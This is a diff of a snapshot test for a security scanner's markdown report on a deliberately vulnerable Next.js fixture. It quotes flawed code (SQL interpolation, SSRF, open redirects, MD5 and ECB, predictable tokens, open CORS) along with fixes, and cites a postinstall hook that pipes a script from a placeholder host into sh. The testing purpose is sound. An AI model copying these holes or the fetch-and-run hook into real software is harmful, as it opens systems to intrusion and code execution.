@@ -3,13 +3,15 @@ source: crates/reporters/tests/snapshots.rs
 expression: encoded
 ---
 # owlwarden report — fixtures/vulnerable/next-api
-_7 files · 0.120s · 10 high · 11 medium_
+_7 files · node (defaulted) · 0.120s · 10 high · 11 medium_
+_12 internet-reachable · 4 internal · 5 unclassified_
 
-## High
+## Internet-reachable — on a request path with no authentication gate identified
 
 ### SQL query built by string interpolation · A03:2021 · CWE-89
 **Where:** `app/api/login/route.ts:16:5` (route `/api/login`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   14    // sql-injection
@@ -32,6 +34,7 @@ await prisma.$queryRaw`SELECT * FROM users WHERE id = ${id}`
 ### Server fetches a URL the caller controls · A10:2021 · CWE-918
 **Where:** `app/api/proxy/route.ts:19:28` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   17    // ssrf
@@ -52,6 +55,7 @@ const upstream = await fetch(url, { redirect: 'error' })
 ### Server fetches a URL the caller controls · A10:2021 · CWE-918
 **Where:** `app/api/proxy/route.ts:25:28` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   23    // ssrf: axios reaches a second caller-controlled host.
@@ -72,6 +76,7 @@ const upstream = await fetch(url, { redirect: 'error' })
 ### Server fetches a URL the caller controls · A10:2021 · CWE-918
 **Where:** `app/api/proxy/route.ts:32:28` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   30    const gotUrl = url.searchParams.get('gotUrl')
@@ -92,6 +97,7 @@ const upstream = await fetch(url, { redirect: 'error' })
 ### Server fetches a URL the caller controls · A10:2021 · CWE-918
 **Where:** `app/api/proxy/route.ts:40:7` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   38    if (nodeUrl) {
@@ -112,6 +118,7 @@ const upstream = await fetch(url, { redirect: 'error' })
 ### Stack trace leaked in error response · A05:2021 · CWE-209
 **Where:** `app/api/users/route.ts:20:16` (route `GET /api/users`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   18    } catch (err) {
@@ -132,111 +139,10 @@ return NextResponse.json(
 ```
 **Why it matters:** Stack traces expose absolute file paths, dependency versions, and internal call structure — enough to fingerprint the stack and locate other weaknesses.
 
-### Credential hardcoded in source · A07:2021 · CWE-798
-**Where:** `app/lib/billing.ts:3:20` (next)
-**Confidence:** likely
-
-```
-   1  // FIXTURE: hardcoded-secret — Stripe live key prefix.
-   2  // Non-alphanumeric character keeps GitHub push protection from blocking the repo.
-   3  const STRIPE_KEY = 'sk_l***'   // ← credential written into source
-   4  
-   5  export async function charge(amountCents: number) {
-```
-
-**Fix (next)** — Read it from the environment on the server. A NEXT\_PUBLIC\_ prefix ships the value to the browser, so never use one for a secret.
-
-```
-const apiKey = process.env.API_KEY
-if (!apiKey) throw new Error('API_KEY is not set')
-```
-**Why it matters:** This literal carries the prefix of a Stripe live secret key, so it is a real credential rather than a placeholder. It is in the repository's history and in every clone; deleting the line does not revoke it.
-
-### Broken cryptographic primitive protecting a secret · A02:2021 · CWE-327
-**Where:** `app/lib/crypto.ts:8:35` (next)
-**Confidence:** likely
-
-```
-   6  export function hashPassword(password: string): string {
-   7    // weak-crypto: MD5 over a password.
-   8    const passwordHash = createHash('md5').update(password).digest('hex')   // ← fast hash protecting a credential
-   9    return passwordHash
-  10  }
-```
-
-**Fix (next)** — Replace the broken digest algorithm with sha256 (or prefer scrypt/argon2 for passwords).
-
-```
-'sha256'
-```
-**Why it matters:** This hash is fast, and speed is the attacker's advantage: a commodity GPU tries billions of candidates a second, so a leaked table of these hashes is a leaked table of the values behind them. Password hashing needs a deliberately slow algorithm with a per-value salt.
-
-### Broken cryptographic primitive protecting a secret · A02:2021 · CWE-327
-**Where:** `app/lib/crypto.ts:14:24` (next)
-**Confidence:** likely
-
-```
-  12  export function mintSessionToken(): string {
-  13    // weak-crypto: predictable session token.
-  14    const sessionToken = Math.random().toString(36).slice(2)   // ← predictable random source used for a secret
-  15    return sessionToken
-  16  }
-```
-
-**Fix (next)** — Use Web Crypto (or node:crypto) instead of Math.random() for tokens.
-
-```
-(globalThis.crypto.getRandomValues(new Uint32Array(1))[0] / 0x100000000)
-```
-**Why it matters:** Math.random() is a fast PRNG, not a cryptographic one; V8 documents it as unsuitable for security. An attacker who sees a few outputs can predict the rest, which for a session id or a reset token means minting valid ones.
-
-### Broken cryptographic primitive protecting a secret · A02:2021 · CWE-327
-**Where:** `app/lib/crypto.ts:20:18` (next)
-**Confidence:** likely
-
-```
-  18  export function sealCard(pan: string, key: Buffer): Buffer {
-  19    // weak-crypto: ECB leaks structure.
-  20    const cipher = createCipheriv('aes-256-ecb', key, null)   // ← broken cipher
-  21    return Buffer.concat([cipher.update(pan, 'utf8'), cipher.final()])
-  22  }
-```
-
-**Fix (next)** — Use node:crypto in the route handler. Note that the edge runtime has no node:crypto — use globalThis.crypto.randomUUID() and Web Crypto there, or pin the route to nodejs.
-
-```
-import { randomBytes, randomUUID, scrypt } from 'node:crypto'
-
-// Tokens and session ids: unpredictable, not merely random-looking.
-const sessionId = randomUUID()
-const resetToken = randomBytes(32).toString('base64url')
-
-// Passwords: a slow hash with a per-password salt. bcrypt and argon2 are
-// equally correct; scrypt needs no dependency.
-const salt = randomBytes(16)
-const hash = await new Promise<Buffer>((resolve, reject) =>
-  scrypt(password, salt, 64, (error, key) => (error ? reject(error) : resolve(key))),
-)
-```
-**Why it matters:** This cipher or mode is broken independently of the key. DES has a keyspace small enough to search, RC4 has biased output, and ECB encrypts identical plaintext blocks to identical ciphertext blocks — the structure of the data survives encryption.
-
-
-## Medium
-
-### GitHub Action is not pinned to a commit SHA · A08:2021 · CWE-829
-**Where:** `.github/workflows/ci.yml:8:1` (next)
-**Confidence:** likely
-
-**Fix (next)** — Pin the action to a full commit SHA (keep the tag in a comment for humans).
-
-```
-uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
-```
-**Why it matters:** A moving tag can be retargeted to a different commit. Anyone who can push that tag — or who compromises the action's repository — runs code in your CI with access to repository secrets.
-
 ### Redirect target comes from the caller · A01:2021 · CWE-601
 **Where:** `app/api/proxy/route.ts:50:5` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   48    // open-redirect
@@ -258,6 +164,7 @@ redirect(safeRedirect(next, request.nextUrl.origin))
 ### Redirect target comes from the caller · A01:2021 · CWE-601
 **Where:** `app/api/proxy/route.ts:56:5` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   54    const extraNext = url.searchParams.get('extraNext')
@@ -279,6 +186,7 @@ redirect(safeRedirect(next, request.nextUrl.origin))
 ### Redirect target comes from the caller · A01:2021 · CWE-601
 **Where:** `app/api/proxy/route.ts:62:5` (route `/api/proxy`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   60    if (manualNext) {
@@ -301,6 +209,7 @@ redirect(safeRedirect(next, request.nextUrl.origin))
 ### Sensitive data written to a log · A09:2021 · CWE-532
 **Where:** `app/api/users/route.ts:11:18` (route `/api/users`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
    9  export async function GET(request: Request) {
@@ -321,6 +230,7 @@ console.info({ event: 'login_attempt', userId })
 ### Sensitive data written to a log · A09:2021 · CWE-532
 **Where:** `app/api/users/route.ts:14:18` (route `/api/users`, next)
 **Confidence:** likely
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   12    // sensitive-data-logged: the caller's access token, logged the same way.
@@ -338,69 +248,10 @@ console.info({ event: 'login_attempt', userId })
 ```
 **Why it matters:** Logs are copied into aggregators, retained for months, and readable by anyone with access to the logging system. A credential that reaches a log has left the application's trust boundary.
 
-### Cross-origin policy accepts any origin · A05:2021 · CWE-942
-**Where:** `app/lib/cors.ts:7:3` (next)
-**Confidence:** likely
-
-```
-   5  
-   6  export function applyOpenCors(response: NextResponse): NextResponse {
-   7    response.headers.set('Access-Control-Allow-Origin', '*')   // ← accepts requests from any origin
-   8    response.headers.set('Access-Control-Allow-Credentials', 'true')
-   9    return response
-```
-
-**Fix (next)** — Return an explicit origin from the route or middleware, not '\*'.
-
-```
-const allowed = new Set(['https://app.example.com'])
-const origin = request.headers.get('origin') ?? ''
-if (allowed.has(origin)) {
-  response.headers.set('Access-Control-Allow-Origin', origin)
-  response.headers.set('Vary', 'Origin')
-}
-```
-**Why it matters:** Any origin may call this API and read the response. That is a deliberate choice for a public endpoint and a mistake for anything behind a session — nothing in the source says which this is, so it is reported for you to decide.
-
-### Package declares an install-time script · A08:2021 · ASI04 · CWE-829
-**Where:** `package.json:7:5` (next)
-**Confidence:** likely
-
-```
-   5    "description": "Deliberately vulnerable Next.js App Router fixture. Never deploy this.",
-   6    "scripts": {
-   7      "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"   // ← runs automatically on install (postinstall)
-   8    },
-   9    "dependencies": {
-```
-
-**Fix (next)** — Move the work into an explicit script the developer runs (\`pnpm setup\`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.
-
-```
-// package.json
-"scripts": { "prepare": "next build" }
-// and: pnpm config set ignore-scripts true
-```
-**Why it matters:** \`postinstall\` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread.
-
-### Dependency version is unpinned · A06:2021 · CWE-1104
-**Where:** `package.json:14:1` (next)
-**Confidence:** likely
-
-**Fix (next)** — Pin the dependency in package.json and reinstall so the lockfile records it.
-
-```
-{
-  "dependencies": {
-    "next": "^14.2.0"
-  }
-}
-```
-**Why it matters:** An unpinned range lets the next install resolve a different major version, including one with a known vulnerability or a breaking API change, without anyone reviewing the bump.
-
 ### Cookie set without its protective attributes · A05:2021 · CWE-614
 **Where:** `app/api/login/route.ts:20:3` (route `/api/login`, next)
 **Confidence:** possible
+**Exposure:** internet — on a request path with no authentication gate identified
 
 ```
   18  
@@ -422,9 +273,63 @@ cookies().set('session', token, {
 ```
 **Why it matters:** This cookie is missing protections: httpOnly keeps the cookie out of reach of JavaScript, so a cross-site scripting bug cannot read the session; secure stops the cookie being sent over plain HTTP; sameSite stops the browser attaching the cookie to cross-site requests.
 
+
+## Internal — not on a request-handling path
+
+### GitHub Action is not pinned to a commit SHA · A08:2021 · CWE-829
+**Where:** `.github/workflows/ci.yml:8:1` (next)
+**Confidence:** likely
+**Exposure:** internal — not on a request-handling path
+
+**Fix (next)** — Pin the action to a full commit SHA (keep the tag in a comment for humans).
+
+```
+uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+```
+**Why it matters:** A moving tag can be retargeted to a different commit. Anyone who can push that tag — or who compromises the action's repository — runs code in your CI with access to repository secrets.
+
+### Package declares an install-time script · A08:2021 · ASI04 · CWE-829
+**Where:** `package.json:7:5` (next)
+**Confidence:** likely
+**Exposure:** internal — not on a request-handling path
+
+```
+   5    "description": "Deliberately vulnerable Next.js App Router fixture. Never deploy this.",
+   6    "scripts": {
+   7      "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"   // ← runs automatically on install (postinstall)
+   8    },
+   9    "dependencies": {
+```
+
+**Fix (next)** — Move the work into an explicit script the developer runs (\`pnpm setup\`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.
+
+```
+// package.json
+"scripts": { "prepare": "next build" }
+// and: pnpm config set ignore-scripts true
+```
+**Why it matters:** \`postinstall\` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread.
+
+### Dependency version is unpinned · A06:2021 · CWE-1104
+**Where:** `package.json:14:1` (next)
+**Confidence:** likely
+**Exposure:** internal — not on a request-handling path
+
+**Fix (next)** — Pin the dependency in package.json and reinstall so the lockfile records it.
+
+```
+{
+  "dependencies": {
+    "next": "^14.2.0"
+  }
+}
+```
+**Why it matters:** An unpinned range lets the next install resolve a different major version, including one with a known vulnerability or a breaking API change, without anyone reviewing the bump.
+
 ### Security headers are not configured · A05:2021 · CWE-693
 **Where:** `package.json:1:1` (next)
 **Confidence:** possible
+**Exposure:** internal — not on a request-handling path
 
 **Fix (next)** — Add a headers() block to next.config.js.
 
@@ -448,3 +353,123 @@ module.exports = {
 }
 ```
 **Why it matters:** Without these headers the browser enforces nothing: strict-transport-security forces HTTPS for future requests; content-security-policy limits which scripts and origins the page may load; x-content-type-options stops browsers guessing a response's content type; x-frame-options blocks clickjacking via framing; referrer-policy stops URLs leaking to third parties.
+
+
+## Unclassified — the framework profile could not place this file
+
+### Credential hardcoded in source · A07:2021 · CWE-798
+**Where:** `app/lib/billing.ts:3:20` (next)
+**Confidence:** likely
+**Exposure:** unknown — the framework profile could not place this file
+
+```
+   1  // FIXTURE: hardcoded-secret — Stripe live key prefix.
+   2  // Non-alphanumeric character keeps GitHub push protection from blocking the repo.
+   3  const STRIPE_KEY = 'sk_l***'   // ← credential written into source
+   4  
+   5  export async function charge(amountCents: number) {
+```
+
+**Fix (next)** — Read it from the environment on the server. A NEXT\_PUBLIC\_ prefix ships the value to the browser, so never use one for a secret.
+
+```
+const apiKey = process.env.API_KEY
+if (!apiKey) throw new Error('API_KEY is not set')
+```
+**Why it matters:** This literal carries the prefix of a Stripe live secret key, so it is a real credential rather than a placeholder. It is in the repository's history and in every clone; deleting the line does not revoke it.
+
+### Broken cryptographic primitive protecting a secret · A02:2021 · CWE-327
+**Where:** `app/lib/crypto.ts:8:35` (next)
+**Confidence:** likely
+**Exposure:** unknown — the framework profile could not place this file
+
+```
+   6  export function hashPassword(password: string): string {
+   7    // weak-crypto: MD5 over a password.
+   8    const passwordHash = createHash('md5').update(password).digest('hex')   // ← fast hash protecting a credential
+   9    return passwordHash
+  10  }
+```
+
+**Fix (next)** — Replace the broken digest algorithm with sha256 (or prefer scrypt/argon2 for passwords).
+
+```
+'sha256'
+```
+**Why it matters:** This hash is fast, and speed is the attacker's advantage: a commodity GPU tries billions of candidates a second, so a leaked table of these hashes is a leaked table of the values behind them. Password hashing needs a deliberately slow algorithm with a per-value salt.
+
+### Broken cryptographic primitive protecting a secret · A02:2021 · CWE-327
+**Where:** `app/lib/crypto.ts:14:24` (next)
+**Confidence:** likely
+**Exposure:** unknown — the framework profile could not place this file
+
+```
+  12  export function mintSessionToken(): string {
+  13    // weak-crypto: predictable session token.
+  14    const sessionToken = Math.random().toString(36).slice(2)   // ← predictable random source used for a secret
+  15    return sessionToken
+  16  }
+```
+
+**Fix (next)** — Use Web Crypto (or node:crypto) instead of Math.random() for tokens.
+
+```
+(globalThis.crypto.getRandomValues(new Uint32Array(1))[0] / 0x100000000)
+```
+**Why it matters:** Math.random() is a fast PRNG, not a cryptographic one; V8 documents it as unsuitable for security. An attacker who sees a few outputs can predict the rest, which for a session id or a reset token means minting valid ones.
+
+### Broken cryptographic primitive protecting a secret · A02:2021 · CWE-327
+**Where:** `app/lib/crypto.ts:20:18` (next)
+**Confidence:** likely
+**Exposure:** unknown — the framework profile could not place this file
+
+```
+  18  export function sealCard(pan: string, key: Buffer): Buffer {
+  19    // weak-crypto: ECB leaks structure.
+  20    const cipher = createCipheriv('aes-256-ecb', key, null)   // ← broken cipher
+  21    return Buffer.concat([cipher.update(pan, 'utf8'), cipher.final()])
+  22  }
+```
+
+**Fix (next)** — Use node:crypto in the route handler.
+
+```
+import { randomBytes, randomUUID, scrypt } from 'node:crypto'
+
+// Tokens and session ids: unpredictable, not merely random-looking.
+const sessionId = randomUUID()
+const resetToken = randomBytes(32).toString('base64url')
+
+// Passwords: a slow hash with a per-password salt. bcrypt and argon2 are
+// equally correct; scrypt needs no dependency.
+const salt = randomBytes(16)
+const hash = await new Promise<Buffer>((resolve, reject) =>
+  scrypt(password, salt, 64, (error, key) => (error ? reject(error) : resolve(key))),
+)
+```
+**Why it matters:** This cipher or mode is broken independently of the key. DES has a keyspace small enough to search, RC4 has biased output, and ECB encrypts identical plaintext blocks to identical ciphertext blocks — the structure of the data survives encryption.
+
+### Cross-origin policy accepts any origin · A05:2021 · CWE-942
+**Where:** `app/lib/cors.ts:7:3` (next)
+**Confidence:** likely
+**Exposure:** unknown — the framework profile could not place this file
+
+```
+   5  
+   6  export function applyOpenCors(response: NextResponse): NextResponse {
+   7    response.headers.set('Access-Control-Allow-Origin', '*')   // ← accepts requests from any origin
+   8    response.headers.set('Access-Control-Allow-Credentials', 'true')
+   9    return response
+```
+
+**Fix (next)** — Return an explicit origin from the route or middleware, not '\*'.
+
+```
+const allowed = new Set(['https://app.example.com'])
+const origin = request.headers.get('origin') ?? ''
+if (allowed.has(origin)) {
+  response.headers.set('Access-Control-Allow-Origin', origin)
+  response.headers.set('Vary', 'Origin')
+}
+```
+**Why it matters:** Any origin may call this API and read the response. That is a deliberate choice for a public endpoint and a mistake for anything behind a session — nothing in the source says which this is, so it is reported for you to decide.
